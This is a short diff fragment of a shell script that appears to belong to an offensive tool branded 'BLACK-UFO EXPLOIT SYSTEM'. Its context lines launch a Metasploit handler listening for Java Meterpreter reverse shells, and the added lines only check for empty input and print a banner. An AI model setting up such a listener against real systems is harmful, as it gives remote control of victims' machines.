@@ -177,3 +177,16 @@ echo "Starting lisener"
         msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set LHOST $ip ; set LPORT $port ; run -j ;"
 
 fi
+
+#OwO
+
+#IF THE IMPUT IS EMPTY
+NULT="$NULL"
+if [ -z "$msf0" ]
+then
+   echo "THE INPUT IS EMPTY $NULT"
+fi
+echo "THANK YOU FOR USING BLACK-UFO EXPLOIT SYSTEM"
+
+read 
+
